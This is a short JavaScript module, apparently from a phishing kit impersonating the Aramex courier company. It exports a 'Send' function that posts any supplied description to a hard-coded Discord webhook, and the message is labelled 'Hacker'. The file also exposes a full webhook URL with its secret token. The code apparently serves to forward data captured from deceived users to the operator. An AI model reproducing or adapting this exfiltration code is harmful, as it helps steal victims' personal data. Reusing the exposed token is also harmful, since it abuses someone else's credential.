import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328876554608050218/EzFsHCgLT4oqIXmDCgxkOg_OYhNOd4WG85EEnF7cNpSS7VE34lVysQy4Z1Y_sxh6-Y0F",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
